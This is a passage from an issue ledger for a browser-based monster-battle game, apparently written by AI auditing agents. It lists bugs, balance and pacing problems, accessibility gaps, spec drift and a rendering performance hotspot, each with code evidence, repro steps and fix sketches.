**Title**: _renderCrucible rebuilds a 17.7KB / 109-node innerHTML on every open + lead-collect + hard-mode toggle

**Evidence**:
```js
// _renderCrucible(): single innerHTML assign of a fully-rebuilt template literal.
// body.innerHTML = `...~17,700 chars, 109 element nodes...`
// Called from: enterCrucible(), toggleCrucibleHardMode() (every checkbox click),
// and bossCollectLead()->finish() (re-renders after each of 3 lead collects).
const png = (path) => `<img src="${path}?v=20260516" ... >`;       // 9 <img> built each call
const btn = (icon, label, onClick, accent, tip) => `<button ...>`; // 16+ buttons built each call
body.innerHTML = ` ... 17.7 KB string ... `;
```

**Repro**: `node /tmp/perf-ext.mjs` (custom bench) — `_renderCrucible` via `StoryMode.toggleCrucibleHardMode` measured median **29-31ms / call (jsdom, 3 runs)**, max 110ms; isolated `innerHTML` assign of the produced 17,691-char/109-node string = **29.5ms median** — i.e. the entire cost is the DOM parse, string concat is negligible. Production browser innerHTML parse is ~5-10x faster than jsdom, so estimate ~3-6ms real, but this is the single largest UI hotspot measured and it re-runs the FULL hub rebuild for trivial state changes (one checkbox).

**Blast radius**: Crucible (post-game super-hub). Toggling Hard Mode, collecting any of the 3 Caged-God leads, and every hub re-entry each trigger a full 109-node teardown+rebuild. On low-end mobile the innerHTML reparse is the likely source of a visible hitch when toggling Hard Mode.

**Fix sketch**: Split the static facility grid (buttons never change) from the dynamic bits (gold value, Hard-Mode checkbox state, Caged-God tracker). Render the static shell once; on toggle/collect, update only the changed nodes (checkbox `.checked`, the Caged-God `<div>`, the gold span) instead of reassigning the whole `body.innerHTML`.

**Verification**: Re-run the bench; a targeted-update path for `toggleCrucibleHardMode` should drop from ~30ms to <1ms (no full reparse). Confirm Crucible visuals unchanged.

---

## <a id="ISSUE-107"></a> ISSUE-107: Battle Frontier hub displays stale, weaker foe-scaling numbers than what applyStoryLeagueFoeStatBoost actually applies

---
id: ISSUE-107
severity: P2
category: inconsistency
anchor_symbol: _renderFrontierHub
current_line_hint: ~43747
file: battle.html
agents: [story-mode-investigator]
fingerprint: eb2165a89001
confidence: high
status: open
---

**Title**: Battle Frontier hub displays stale, weaker foe-scaling numbers than what applyStoryLeagueFoeStatBoost actually applies

**Evidence**:
```js
// _renderFrontierHub (display):
const hpMult = Math.min(2.50, 1.35 + (round - 1) * 0.05);     // caps 2.50
const bulkMult = Math.min(1.80, 1.20 + (round - 1) * 0.03);   // caps 1.80
// applyStoryLeagueFoeStatBoost (actually applied, "accelerated ramp"):
const hpM   = Math.min(3.00, 1.50 + (round - 1) * 0.075);     // caps 3.00
const bulkM = Math.min(2.00, 1.25 + (round - 1) * 0.045);     // caps 2.00
```

**Repro**: Open the Battle Frontier hub. It prints "Round N foe stats: HP ×X, bulk/speed ×Y" using the OLD formula, and the intro tip says "+35% HP edge at the start". But `applyStoryLeagueFoeStatBoost` (the function startBattle actually runs on Frontier foes) uses the post-overhaul sharper curve. Computed deltas: round 1 displays HP ×1.35 / actual ×1.50; round 10 displays ×1.80 / actual ×2.18; round 21 displays ×2.35 / actual ×3.00. Bulk/speed likewise understated, and the display omits that speed scales too.

**Blast radius**: Player-facing difficulty information for the entire Frontier ladder. Players plan team investment off numbers that understate the real wall — every round is meaningfully harder than advertised. The "accelerated ramp" overhaul updated the apply-side but left two display sites (the per-round line ~43759 and the intro tip ~43738) on the pre-overhaul formula.

**Fix sketch**: Single-source the multipliers: have `_renderFrontierHub` read the same constants/formula as `applyStoryLeagueFoeStatBoost` (factor it into a shared `_frontierFoeMult(round)` helper) and update the intro-tip copy to "+50% HP edge at the start ... caps at +200% HP".

**Verification**: Hub round-N display equals the actual maxHp/stat multiplier applied to a Frontier foe at round N (compare displayed string vs `mon.maxHp` ratio post-boost).

---

## <a id="ISSUE-108"></a> ISSUE-108: ~12 parallel event-presentation paths with 3 z-index layers and no single registry

---
id: ISSUE-108
severity: P2
category: refactor
anchor_symbol: _renderNarrativeOverlay
current_line_hint: ~46830
file: battle.html
agents: [story-mode-investigator]
fingerprint: 20e830d422c1
confidence: high
status: open
---

**Title**: ~12 parallel event-presentation paths with 3 z-index layers and no single registry

**Evidence**:
```text
_renderNarrativeOverlay (z9998)  — cold-opens, 3-track beat scenes, post-battle scenes  [paged, Continue, no auto-dismiss]
showBattleIntro        (z9999)  — bespoke VS splash + quote                               [timed auto-advance 2.2-3.4s]
showVictoryOverlay     (z9999)  — bespoke confetti + up-next pill                         [6s auto-dismiss]
_showStoryTutorialScene         — STORY_TUTORIAL_SCENES, 4-stage animated overlay
_showRoamingLegendarySighting / _showFirstSightingLoreOverlay — bespoke catch cinematics
_showBossBanner / showGimmickBanner — non-blocking flash banners
showGameAlert          (~z1200) — modal alert (anomaly seeds, track rewards)
_storyShowOneTimeTip            — plain-text tip (vs sprite-backed scenes elsewhere)
_maybeShowSaveToast             — "Saved" toast
```

**Repro**: Grep `function (_render|_show|show)\w*(Overlay|Scene|Banner|Alert|Tip|Toast|Intro|Sighting)`. Each surface builds its own DOM with its own z-index, dismissal model (timed vs click vs Escape), and a11y posture. No shared "present this event" entry point.

**Blast radius**: The maintainer's deliverable (4): inconsistent/duplicate presentation. Notably z-order collides — `showGameAlert` (~1200) renders BEHIND `showVictoryOverlay` (9999), the documented NOTIF-1 (anomaly seed / reward toast paints behind the victory card; partly worked around by `{silent:true}` on track rewards, but anomaly seeds @ processNextEvent still use the bare alert).

**Fix sketch**: One event-presentation registry per STORY_OVERHAUL_PLAN §4: `{ type → {renderer, z, dismiss, a11y} }`, with a single `presentStoryEvent(kind, payload, onDone)` dispatcher. Migrate cold-opens/beats/tutorials/sightings/victory onto it incrementally; pick one z-stack.

**Verification**: All story narrative surfaces route through one function; z-index + dismissal + dialog-role are uniform; the alert-behind-overlay class is structurally impossible.

---

## <a id="ISSUE-109"></a> ISSUE-109: Road beat clumping: 2 beats/road (villain road7 = 3, league = 7) play back-to-back, breaking pacing

---
id: ISSUE-109
severity: P2
category: balance
anchor_symbol: _resolveActiveRoadBeats
current_line_hint: ~42126
file: battle.html
agents: [story-mode-investigator]
fingerprint: cc5df56aa969
confidence: high
status: open
---

**Title**: Road beat clumping: 2 beats/road (villain road7 = 3, league = 7) play back-to-back, breaking pacing

**Evidence**:
```text
MAIN per-road:    road1:1 road3:1 road5:2 road7:2 road8:1 league:7
VILLAIN per-road: road2:1 road3:1 road4:2 road5:2 road6:2 road7:3
EXTRA per-road:   road1:1 road2:1 road3:1 road4:2 road5:2 road6:2 road7:1
// All tracks fire SIMULTANEOUSLY (one main + one villain + one extra rolled per run), so a single
// road can stack main+villain+extra event-beats: e.g. road5 = main.event3 + villain.event4 + extra.event5
// all drain in one _playStoryBeatQueue before the road's fights.
```

**Repro**: On road5, `_resolveActiveRoadBeats('road5')` aggregates MAIN (event3), the rolled villain (event4) and the rolled extra (event5) — up to 3 unrelated event scenes play consecutively before the player fights anyone. Road7 stacks even more (MAIN event4, villain event6, extra ending).

**Blast radius**: Whole-run pacing. Because beats only fire when the player walks into a battle (not on city exit), they pool up and dump in a wall of overlays. This is the structural cause of ledger ISSUE-223's "6 beats back-to-back," generalized to every road once three concurrent tracks are summed.

**Fix sketch**: Spread beats across the road's multiple battle rows (one beat per battle entry, in priority order), instead of draining the whole road queue at the first battle. The road map already has 3-5 battle rows per road to distribute onto.

**Verification**: Walking a road with 3 queued event-beats shows them spaced across that road's battles, not all at the first fight.

---

## <a id="ISSUE-110"></a> ISSUE-110: Catch-tutorial gate comment claims "starting kit gives 5 balls" — fresh-run kit is actually 0

---
id: ISSUE-110
severity: P2
category: dx
anchor_symbol: _shouldFireCatchTutorialBeforeBattle
current_line_hint: ~46940
file: battle.html
agents: [story-mode-investigator]
fingerprint: 771f1e021e9c
confidence: high
status: open
---

**Title**: Catch-tutorial gate comment claims "starting kit gives 5 balls" — fresh-run kit is actually 0

**Evidence**:
```js
// Player must have at least one Poké Ball (starting kit gives 5,
// so this is just a safety net).
const balls = sm.balls || {};
const totalBalls = (balls.poke | 0) + (balls.great | 0) + ...;
if (totalBalls <= 0) return false;   // tutorial silently NO-OPs at 0 balls
```

**Repro**: Fresh-run init (`@39514`) sets `balls:{poke:0}`. The 5 balls come only from the mandatory City-0 Mart welcome scene (`firstMart.onContinue` ⇒ `_storyGrantBundle({pokeBall:5})`). The comment misattributes the source to the run kit.

**Blast radius**: The catch tutorial AND `catchThrow` (`@50940`, which hard-requires `sm.balls[k] > 0`) both depend entirely on the forced City-0 Mart gate (`_isFacilityRequiredHere(0,'mart')` ⇒ true) firing before the intro rival. Confirmed safe in normal flow (Mart precedes intro rival at array idx 1, and the welcome grant re-fires every run via per-run `sm.scenesShown`). But the latent coupling is undocumented at the gate: if the Mart force-gate were ever weakened or a variant/skip path bypassed it, the tutorial would silently no-op (0 actionable buttons, Run hidden in tutorialMode, no bossRetreat escape) — a screen with nothing to click.

**Fix sketch**: Either (a) seed `balls:{poke:5}` in fresh-run init (`@39514`) to match the v15-migration default and the spec §1/§10, making the kit self-sufficient and the comment true; or (b) fix the comment to state the 5 balls come from the mandatory first-Mart visit and add an assertion/guard that the catch screen never renders with 0 throwable balls in non-boss mode.

**Verification**: Set fresh sm to post-intro-rival row with `balls:{poke:0}` and confirm the catch screen is never reachable without a Run/exit affordance.

---

## <a id="ISSUE-111"></a> ISSUE-111: Story tutorial overlay (STORY_TUTORIAL_SCENES) is not a dialog — no role, focus trap, or ESC

---
id: ISSUE-111
severity: P2
category: a11y
anchor_symbol: _showStoryTutorialScene
current_line_hint: ~34943
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 3bc8f10d137b
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Story tutorial overlay (STORY_TUTORIAL_SCENES) is not a dialog — no role, focus trap, or ESC

**Evidence**:
```js
// _showStoryTutorialScene at ~34943
const ov = document.createElement('div');
ov.className = 'story-tutorial-overlay';   // no role, no aria-modal
…
ov.querySelector('button').onclick = function (e) { e.stopPropagation(); dismiss(); };
ov.onclick = function (e) { if (e.target === ov) dismiss(); };
document.body.appendChild(ov);             // no autofocus on Continue
```

The full-screen tutorial overlay (Prof. Oak intros for first-trainer-battle, first-wild, first-mart, etc. in `STORY_TUTORIAL_SCENES`) is a `<div>` with no `role="dialog"`, no `aria-modal="true"`, no `aria-labelledby` pointing at the nameplate, no focus management (focus stays on whatever button triggered the overlay), and no `Escape` key handler. Click-outside dismiss + auto-focus + ESC are the standard expectations for a story-blocking modal.

**Repro**: Trigger `playStoryTutorial('firstWild', …)` (first wild encounter). Open with keyboard — Tab does not enter the dialog; Esc does nothing; SR sees a context-less paragraph dropped into the page.

**Blast radius**: All 10+ first-time-mechanic scenes (firstTrainerBattle, firstWild, firstSafariCatch, firstMart, firstDept, firstSafari, firstCasino, firstPokemonCenter, …). These are the first impression for new players, so the keyboard/SR experience here is load-bearing for onboarding.

**Fix sketch**: Set `ov.setAttribute('role','dialog')` and `aria-modal="true"`; give the nameplate `id="story-tutorial-name-<uid>"` and `aria-labelledby` the overlay; `requestAnimationFrame(() => ov.querySelector('button').focus())`; add a keydown listener for `Escape`/`Enter` that calls `dismiss()`. Remove the listener on dismiss.

**Verification**: Tab into the overlay; SR announces "Your First Fight, dialog". Esc closes. Focus returns to the previously-focused element.

---

## <a id="ISSUE-112"></a> ISSUE-112: WANDER_AROUND_SPEC says "not yet implemented" but Wander Around shipped at SAVE_VER 23

---
id: ISSUE-112
severity: P2
category: inconsistency
anchor_symbol: _showWanderScreen
current_line_hint: ~49782
file: docs/story-design/WANDER_AROUND_SPEC.md
agents: [spec-drift-auditor]
fingerprint: b7555fbd4e2c
confidence: high
status: open
---

**Title**: WANDER_AROUND_SPEC says "not yet implemented" but Wander Around shipped at SAVE_VER 23

**Evidence**:
```text
WANDER_AROUND_SPEC.md:2  "Status: Design spec — not yet implemented. No battle.html / save-schema code has been touched."
:222 "SAVE_VER is currently 22 ... Bump to 23."
battle.html: _showWanderScreen / _wanderState / _wanderRate / _wanderSimulate defined (~49729-49864),
  WANDER_MAX_TAPS / WANDER_BASE_RATE / WANDER_RATE_DECAY const, called at 43220
  (_showWanderScreen(_wkey, cidx, () => enterCity())). SAVE_VER = 24; v23 added sm.wanderByEventIdx.
```

**Repro**: `grep -n "function _showWanderScreen" battle.html` (defined) and `grep -n "_showWanderScreen(_wkey" battle.html` (called from the city-arrival path). SAVE_VER comment at battle.html:34521 documents "v23 (Wander Around) only ADDED the sm.wanderByEventIdx map." The "Search the Tall Grass"/"Move On" buttons from §2 are live.

**Blast radius**: A reader trusting the "not yet implemented" banner could re-implement Wander Around a second time, or sign off on shipping it not realizing it already runs. The spec's open decisions (O1-O6) read as undecided but were resolved in code (3 taps, 0.50 base, 0.5 decay).

**Fix sketch**: Re-stamp the header "Status: SHIPPED (v23)"; reconcile the SAVE_VER reference (22→23 is stale — chain is now at 24, and v23 has no dedicated migration by design). Note any code/spec parameter deltas (verify WANDER_BASE_RATE/decay match §9 defaults).

**Verification**: Header reflects shipped status; SAVE_VER references match battle.html:34527 (=24) and the documented v23 back-fill.

---

## <a id="ISSUE-113"></a> ISSUE-113: Current enemy curve is lumpy, not rising — GL4=GL5 dead zone (foe mult 1.0) and a GL8 quad-cliff (T3->T4 + IV 18->26 + gimmicks 2->3)

---
id: ISSUE-113
severity: P2
category: inconsistency
anchor_symbol: _stageGatedFoeStatMult
current_line_hint: ~13953
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 2f6b5645d86f
confidence: high
status: open
---

**Title**: Current enemy curve is lumpy, not rising — GL4=GL5 dead zone (foe mult 1.0) and a GL8 quad-cliff (T3->T4 + IV 18->26 + gimmicks 2->3)

**Evidence**:
```js
// _stageGatedFoeStatMult (13967): Gym n<6 -> 1.0, n>=6 -> 1.05, n>=8 -> 1.10.
const n = +gl[1]; if (n >= 8) return 1.10; if (n >= 6) return 1.05; return 1.0;
// _storyBuildTierForEvent (33550): GL n<3 T1, n 3-7 -> T2/T3, n>=8 -> TOURNAMENT(T4).
// STORY_IV_TIER_RANGES (30060): T2 {10,22}, T3 {18,28}, T4 {26,31}.
```

**Repro**: Cross-read of the three scaling functions vs docs/story-design/story-power-curve.csv. GL4 and GL5 are identical on every axis (T2, IV 10-22, mult 1.0) precisely when the player unlocks the EV Trainer/Dojo/Safari at C4 — a 2-city power inversion (player spikes, enemy flat). GL8 stacks five escalators in one fight (EV tier, IV floor, gimmick count, sub-trainer grade, legendary gate). Net trajectory today: VERY EASY (GL1-2) -> EASY (GL3) -> dips back toward VERY EASY (GL4-5) -> MEDIUM (GL6-7) -> HARD-spike (GL8) -> HARD (E4). This is assessed against the *current* engine state (not the planned retune).

**Blast radius**: Player-perceived difficulty trajectory across the whole story. The flat/dip-then-cliff shape is the opposite of the desired smooth very-easy->very-hard climb. (The REDESIGN_PLAN already proposes a retune; this finding documents the current shortfall, not the unimplemented plan.)

**Fix sketch**: As the plan's §8a notes — don't let the GL4-5 foe mult collapse to 1.0 (ramp ~1.0->1.03 + small GL5 IV bump), and spread the GL8 jump across GL6-7-8 (IV floor 18->22->26, GL7 partial-T4). Encoded in story-tunables.csv.

**Verification**: Recompute per-GL effective foe BST*mult and IV floor after tuning; assert monotonic non-decreasing across GL1..GL8 with no single-step jump > the chosen ceiling.

---

## <a id="ISSUE-114"></a> ISSUE-114: Boss field-lock sets _bossWeatherLocked/_bossTerrainLocked but nothing reads them; weather decay path (20611/20617) ignores the lock

---
id: ISSUE-114
severity: P2
category: inconsistency
anchor_symbol: _storyBossMechanicsBattleInit
current_line_hint: ~42092
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 4da1f1d412be
confidence: medium
status: open
---

**Title**: Boss field-lock sets _bossWeatherLocked/_bossTerrainLocked but nothing reads them; weather decay path (20611/20617) ignores the lock

**Evidence**:
```js
stateRef.weather = m.value;
stateRef.weatherTurns = (m.turns | 0) || 99;
stateRef._bossWeatherLocked = true;   // never read anywhere
```

**Repro**: `grep -nE '_bossWeatherLocked|_bossTerrainLocked' battle.html` returns only the two writer lines (42092, 42097). The weather tick at battle.html:20611 (`state.weatherTurns--`) and clear at 20617 (`state.weather = null`) don't check the lock, and moves that set weather (Rain Dance etc.) can overwrite it. The 99-turn fallback masks most of this in practice (battles end first), but a foe Rain Dance / Sunny Day / Snowscape overwrites the "locked" primal weather, breaking the Magma/Aqua boss intent (PRIMAL HEAT / PRIMORDIAL RAIN). Low impact today only because Finding 1 means field locks never apply at all.

**Blast radius**: villain.magma.boss and villain.aqua.boss fieldLock mechanics. Cosmetic-adjacent until Finding 1 is fixed.

**Fix sketch**: In the weather decay (20611) and any weather-set move handler, early-return / refuse the change when `state._bossWeatherLocked` (resp. terrain). Or simply document the 99-turn fallback as intended and drop the unused flags.

**Verification**: With a fix, set a boss weather lock then have the foe use Rain Dance; confirm the locked weather persists.

---

## <a id="ISSUE-115"></a> ISSUE-115: Boss surge/immunity timers live on the active foe mon — lost on switch, stale on bench

---
id: ISSUE-115
severity: P2
category: bug
anchor_symbol: _storyBossMechanicsTurnTick
current_line_hint: ~42027
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 1598e26c657a
confidence: high
status: open
---

**Title**: Boss surge/immunity timers live on the active foe mon — lost on switch, stale on bench

**Evidence**:
```js
function _storyBossMechanicsTurnTick(stateRef, foeMon) {
    // foeMon is state.fActive — surge/immunity flags are written on THIS mon only
    if (foeMon._bossSurgeTurns > 0) foeMon._bossSurgeTurns--;
    if (foeMon._bossImmuneTurns > 0) foeMon._bossImmuneTurns--;
    ...
    _applyBossPhaseEffect(foeMon, pending.effect || 'surge', pending.magnitude); // sets foeMon._bossSurgeTurns = 3
```

**Repro**: `node scripts/debug/_repro/boss-edge.mjs` (EDGE 1). faintPhase surge activates on active mon A (`A._bossSurgeTurns=3`). A faints, B switches in; turn tick now runs on B → `B._bossSurgeTurns=0` (no surge), while A keeps a frozen `_bossSurgeTurns=3` on the bench that never decrements. The decrement only ever touches `state.fActive`.

**Blast radius**: All villain-boss faintPhase configs (rocket/magma/aqua/galactic/plasma/flare/skull/yell/macroCosmos/star). The surge phase is *defined* to fire when the team is KO'd — i.e. exactly when the active mon is about to be replaced — so the buffed turns frequently land on the wrong (or a dead) mon. Damage consumer at ~23846 reads `attacker._bossSurgeTurns`, so a freshly-sent mon attacks with no surge even though the phase "activated."

**Fix sketch**: Store surge/immunity on `stateRef` (battle-scoped) rather than per-mon, and have the damage clamp at ~23846/~24105 read `state._bossSurgeTurns`/`state._bossImmuneTurns`. Decrement once per turn in the tick regardless of which mon is active.

**Verification**: Re-run boss-edge.mjs EDGE 1; after A faints and B enters, B should attack with the surge active (or the surge should follow the boss-side, not the mon).

---

## <a id="ISSUE-116"></a> ISSUE-116: Single `_bossPendingTelegraph` slot drops a phase when two mechanics telegraph on the same turn (mfBattle)

---
id: ISSUE-116
severity: P2
category: bug
anchor_symbol: _storyBossMechanicsTurnTick
current_line_hint: ~42030
file: battle.html
agents: [battle-engine-debugger]
fingerprint: e3f00646f827
confidence: high
status: open
---

**Title**: Single `_bossPendingTelegraph` slot drops a phase when two mechanics telegraph on the same turn (mfBattle)

**Evidence**:
```js
// only one pending slot — last writer wins
stateRef._bossPendingTelegraph = { type: 'hpThresholdPhase', ... };   // surge phase
...
stateRef._bossPendingTelegraph = { type: 'immunityRound', ... };      // immunity round
// both set _bossMechanicsFired[firedKey]=true, but only one telegraph survives to activate
```

**Repro**: `node scripts/debug/_repro/boss-mf-clobber.mjs`. mfBattle config = `[hpThresholdPhase@0.50 surge, immunityRound everyN5]`. When the MF drops below 50% HP on a turn that is also `turnNumber % 5 === 4`, both mechanics queue a telegraph into the same slot. The loop processes hpThreshold first then immunityRound, so immunity overwrites surge; BUT both mark their `firedKey` true, so the clobbered phase (`hp_0.5`) is permanently consumed and its surge never activates.

**Blast radius**: `main.mfBattle` (the apex Mystery Figure fight) is the only shipped multi-mechanic config where a HP-threshold phase and a periodic immunity round coexist, so it is the concrete victim. Any future config mixing faintPhase + immunityRound has the same hole.

**Fix sketch**: Make `_bossPendingTelegraph` an array (queue) and drain all entries in the activation step; or guard `_bossMechanicsFired[firedKey]=true` so it is only set once the telegraph actually wins the slot. Prefer the queue.

**Verification**: boss-mf-clobber.mjs collision case should leave BOTH `surge` and `immunity` activating on their respective next turns.

---

## <a id="ISSUE-117"></a> ISSUE-117: Shipped BOSS_CONFIGS uses surge/immunity/heal phases, not the EXPANSION_PLAN "multi-form transformation"

---
id: ISSUE-117
severity: P2
category: inconsistency
anchor_symbol: _storyBossMechanicsTurnTick
current_line_hint: ~42021
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 92d44000abc0
confidence: high
status: open
---

**Title**: Shipped BOSS_CONFIGS uses surge/immunity/heal phases, not the EXPANSION_PLAN "multi-form transformation"

**Evidence**:
```js
// battle.html ~41861 — shipped villain boss
'villain.rocket.boss': { mechanics: [
  { type: 'faintPhase', afterFaints: 0, effect: 'surge', banner: 'CALLED IN' },
  { type: 'faintPhase', afterFaints: 2, effect: 'immunity', banner: 'NO WITNESSES' },
  { type: 'faintPhase', afterFaints: 4, effect: 'surge', banner: "BOSS'S ORDERS" } ] },
```

**Repro**: docs/STORY_EXPANSION_PLAN.md decisions #3/#11/#13/#15/#16 specify bosses morph type-pairing + ability + moveset + field layer at HP thresholds ("multi-form transformation puzzle"). The shipped engine (`_applyBossPhaseEffect`, ~42001) only does `surge` (+25% dmg 3 turns), `immunity` (N turns), `heal`, and `fieldLock` (weather/terrain). No type/ability/moveset morph exists. The implementation instead matches the OLDER docs/story-design/STORY_3TRACK_IMPL_PLAN.md PR-5 (line 501+), not EXPANSION_PLAN.

**Blast radius**: Boss "puzzle" win-feel that EXPANSION_PLAN sells (read the cue, pick the counter) is not what ships; bosses are stat/immunity walls. Anyone implementing EXPANSION_PLAN would rebuild the whole BOSS_CONFIGS schema.

**Fix sketch**: Decide which boss model is canon (see P1 fingerprint 07232f72109f). If the shipped surge/immunity model is intended, retire the transformation design in EXPANSION_PLAN §3; if transformation is the target, mark the current BOSS_CONFIGS as the v1 / interim implementation.

**Verification**: One doc describes the surge/immunity/fieldLock model that actually ships; no doc claims unimplemented per-phase type/ability morphing as current.

---

## <a id="ISSUE-118"></a> ISSUE-118: In-catch "Up next" says "trainer/wild" but a battle-kind beat scene fires between catch and fight

---
id: ISSUE-118
severity: P2
category: bug
anchor_symbol: _storyComputeUpNext
current_line_hint: ~49892
file: battle.html
agents: [story-mode-investigator]
fingerprint: c6cbf62f71a3
confidence: high
status: open
---

**Title**: In-catch "Up next" says "trainer/wild" but a battle-kind beat scene fires between catch and fight

**Evidence**:
```js
// inCatch branch:
if (_shouldFireWildBeforeBattle(battleIdx)) return { icon:'🌿', text:'One more wild on this route' };
const row = STORY_EVENTS_RAW[battleIdx];
return _storyEventRowToUpNext(row);   // → "⚔ Basic Trainer — X"
// On catch-screen resolution the chain re-enters enterBattleEvent, which (after wilds exhaust)
// fires _activeBattleBeatForCurrentRow()'s scene BEFORE launching the fight. The pill never
// mentions that intervening story beat.
```

**Repro**: On a route that carries both a forced wild and an unfired battle-kind beat (e.g. main.battle1 @ road5, or a villain miniBoss @ road6), the catch screen's pill shows "One more wild" or the trainer label; after the last wild resolves, a story-beat scene plays before the trainer. This is the maintainer's "screen previews wild→rival but the true order is wild→event→rival" pattern.

**Blast radius**: All catch-screen transitions on roads that host a battle-kind beat (road5 main.battle1, road6 villain miniBoss + extra raid/event, road7 villain boss). Narrow vs the postVictory cases but same root model split.

**Fix sketch**: Same as the postVictory desync — route the inCatch peek through a shared `_storyPeekNextDispatch()` that accounts for `_activeBattleBeatForCurrentRow`.

**Verification**: On a road with a battle-beat, the catch pill reads the beat (or "Story scene") when that is genuinely next.

---

## <a id="ISSUE-119"></a> ISSUE-119: Foe party size matches `team.length` with per-role floors instead of the spec'd `min(6, 2+badges)` badge curve

---
id: ISSUE-119
severity: P2
category: balance
anchor_symbol: _storyEnemyPartySize
current_line_hint: ~37311
file: battle.html
agents: [story-mode-investigator]
fingerprint: aa41935a60b3
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Foe party size matches `team.length` with per-role floors instead of the spec'd `min(6, 2+badges)` badge curve

**Evidence**:
```js
// battle.html ~37311  (implementation)
function _storyEnemyPartySize(event, playerTeamLen, eventId) {
    if (... Champion / Victory Road / E1-4 / Mystery Figure) return 6;
    if (eventId === STORY_RIVAL_ROW_INTRO) return min(6, max(1, playerTeamLen)); // pure player-match
    let floor = 1;
    if (/Rival/i.test(e)) floor = 2;
    else { /* gym leader 1..2:2, 3..4:3, 5..6:4, 7:5, 8:6 */ }
    return Math.max(floor, min(6, playerTeamLen));   // ← team length + role floor
}

// STORY_MODE_FLOW.md §1 (canonical spec):
//   "Foe sizing | Badge curve: min(6, 2 + badges) for everyone except story
//    finales (always 6) and the intro rival (pure player-match for a 1v1
//    starter duel). So foes = 2 pre-Gym-1, 3 post-Gym-1, …, 6 from
//    post-Gym-4 on."
// STORY_MODE_FLOW.md §1, "Expected sequence" row:
//   "GL2 3v3 → (badge 2, cap 4)"  — but if a player at 1 badge with only
//    2 mons faces GL2, the code returns max(2, min(6, 2)) = 2, not 3.

// Confirming the spec read: the balance audit helper at battle.html:48055
// computes the spec-correct curve as the reference:
const partySize = Math.min(6, 2 + badgesAccum);
```

**Repro**: Start a run, decline every Professor (only the starter), don't catch any wild. Reach GL2 at 1 badge with team.length=1. Foe size = `max(2, min(6, 1)) = 2`, not the spec'd `min(6, 2+1) = 3`.

**Blast radius**: Affects every non-finale foe count for a "non-catcher" player who keeps their party lean. Most-impacted: GL1-GL4 (Stage 1/2) where players regularly skip catches. Sub-leader trainers (Basic Trainer / Gym Trainer / Elite Trainer have role-floor=1) skip the spec curve hardest — at 4 badges + 1 mon they're still 1v1, but spec says 5v5.

**Fix sketch**: Change `_storyEnemyPartySize` to ignore `playerTeamLen` for non-finale, non-intro-rival rows and return the badge curve directly:
```js
function _storyEnemyPartySize(event, _playerTeamLen, eventId) {
    if (... finale list) return 6;
    if (eventId === STORY_RIVAL_ROW_INTRO) return Math.max(1, Math.min(6, _playerTeamLen | 0));
    return Math.min(6, 2 + ((sm && sm.badges) | 0));
}
```
This matches the audit helper at line 48055 exactly. Or update `STORY_MODE_FLOW.md` to ratify the team-length match if that was the intentional balance change.

**Verification**: A no-catcher run at 1 badge facing GL2 should now field 3 foes. The "Expected sequence" table in `STORY_MODE_FLOW.md §1` should match observed behaviour.

---

## <a id="ISSUE-120"></a> ISSUE-120: Caged God removal (v24) is incomplete — residual content/help-text/achievements still reference the cut arc

---
id: ISSUE-120
severity: P2
category: inconsistency
anchor_symbol: _storyEnsureMysteryIdentity
current_line_hint: ~33125
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 7fa907ba5071
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Caged God removal (v24) is incomplete — residual content/help-text/achievements still reference the cut arc

**Evidence**:
```text
battle.html:11337  help: "The Caged God in the post-game needs the Master Ball — saved for that one fight." (live tutorial text)
battle.html:11358  "Safari Zone (City 5) ... Your last party member and Subject Zero are not for sale."
battle.html:34767  achievement caged_god  "Capture Subject Zero in the post-game boss arc."  (now unreachable)
battle.html:34797  achievement r_caged_god "Complete the Caged God post-game boss arc."         (now unreachable)
battle.html:32944-32955  _CAGED_GOD_EPILOGUE_BY_VARIANT full prose table (8 variants)
```

**Repro**: STORY_MODE_FLOW.md §9 + CLAUDE.md say the arc is REMOVED (v24); migrateStoryPreV24 strips `sm.bossArc` and entry is neutralized (battle.html:43078 `sm.bossArc.available=false`). But `grep -ni "caged god\|subject zero" battle.html` = ~97 hits incl. live help text, two achievements, an epilogue table, STORY_BEATS row-67 tag `'cagedGod'` (39521), and a `_bossArcRollLegendary` path. The two achievements unlock only inside the now-dead `bossMode` branch (battle.html:50903), so they became permanently unobtainable on v24.

**Blast radius**: Players see help text promising a Caged God / Master Ball post-game that no longer exists, and two achievements they can never earn (dead milestone slots). This is the exact "cut, not deferred" residue CLAUDE.md flags — and it is NEW since the ledger was generated (18:49Z) before the v24 removal (20:56-21:03Z), so prior Caged-God ledger entries (006/028/029/076/...) describe the arc as live.

**Fix sketch**: Either (a) finish the cut — remove the live help-text Caged-God paragraphs, retire/hide `caged_god`+`r_caged_god` achievements, drop the row-67 `'cagedGod'` tag and `_CAGED_GOD_EPILOGUE_BY_VARIANT`; or (b) if the arc may return, gate the help text + achievements behind a feature flag rather than leaving them in prose.

**Verification**: `grep -ni "caged god\|subject zero" battle.html` returns only intentional history comments; no live UI string or earnable achievement references the cut arc; STORY_MODE_FLOW.md §9's "REMOVED" matches code reality.

---

## <a id="ISSUE-121"></a> ISSUE-121: rollTrainerTeam's evo-stage cap uses cityIndexFromEventIndex on a ROW ID (not array index) — intro Rival gets cap 2 (fully evolved) instead of 0 (basics-only)

---
id: ISSUE-121
severity: P2
category: bug
anchor_symbol: _storyEvoStageCapForRow
current_line_hint: ~33074
file: battle.html
agents: [story-mode-investigator]
fingerprint: 62b71f668975
confidence: high
status: open
---

**Title**: rollTrainerTeam's evo-stage cap uses cityIndexFromEventIndex on a ROW ID (not array index) — intro Rival gets cap 2 (fully evolved) instead of 0 (basics-only)

**Evidence**:
```js
function _storyEvoStageCapForRow(rowIdx) {
    if (rowIdx == null || !(sm && sm.active)) return 2;
    return _storyEvoStageCapForCity(cityIndexFromEventIndex(rowIdx)); // cityIndexFromEventIndex expects an ARRAY INDEX
}
// caller: rollTrainerTeam(..., event, idx) where idx = ev[0] = ROW ID (~line 42422)
// const _evoStageCap = _storyEvoStageCapForRow(storyRowIdx);  // storyRowIdx is a row ID
```

